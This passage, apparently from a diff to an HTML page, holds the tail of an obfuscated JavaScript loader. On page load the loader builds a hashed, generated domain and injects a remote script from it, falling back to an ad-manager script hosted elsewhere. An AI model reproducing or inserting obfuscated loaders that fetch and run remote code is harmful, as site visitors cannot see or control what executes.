455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
